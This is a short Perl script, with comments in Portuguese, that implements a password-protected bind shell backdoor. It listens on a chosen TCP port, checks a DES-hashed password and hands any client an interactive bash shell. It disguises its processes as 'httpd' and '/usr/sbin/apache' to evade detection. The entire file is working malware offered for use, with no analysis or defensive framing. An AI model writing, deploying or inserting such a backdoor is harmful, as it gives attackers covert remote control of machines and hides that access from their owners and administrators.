#!/usr/bin/perl
#bindshell with DES password 
#by m0nad /at/ email.com
use Socket;
use strict;
use warnings;

my $port	= shift || die "perl $0 <port>\n";

my $PASSWORD	= 'saUsy0rJc.ZPI';							#perl -e 'print crypt ("senha","salto")'              
my $SHELL	= '/bin/bash';								#escolha uma shell
my $FAKE_NAME   = '/usr/sbin/apache' . "\0" x16;					#fake_name da child
$0		= 'httpd' . "\0" x16;							#fake_name do parent


my $proto	= getprotobyname('tcp');						#proto = '6'
socket(SERVER, PF_INET, SOCK_STREAM, $proto) || die "socket: $!";			#inicia o socket
#setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack("l", 1)) || die "setsockopt: $!";	#option do perldoc xD
bind(SERVER, sockaddr_in($port, INADDR_ANY)) || die "bind: $!";				#seleciona uma porta com bind
listen(SERVER, SOMAXCONN) || die "listen: $!";						#coloca a porta em escuta

while(accept(CLIENT, SERVER)) { 						#sem esse loop, o server fecha apos o primeiro cliente sair				 				#accept cria o filehandle "CLIENT" e apartir do fh "SERVER"
  my $pass= undef;								#buffer do recv, onde sera alocado a senha de quem conectar
  open(STDIN, "<&CLIENT");open(STDOUT, ">&CLIENT");open(STDERR, ">&CLIENT");	#joga tudo pro fh "CLIENT"
  recv CLIENT, $pass, 15, 0; 
  chop($pass); 									#recebe a senha
  if (crypt ($pass, $PASSWORD) eq $PASSWORD) { 					#criptografa a senha  e compara com o hash do script, caso correto,
    unless(fork()){ exec({$SHELL} ($FAKE_NAME, "-i")); }			# forka e executa a shell no proceço filho(child), com fork==0
  }
  close(STDIN);close(STDOUT);close(STDERR);close (CLIENT);			#fecha tudo
} 
 
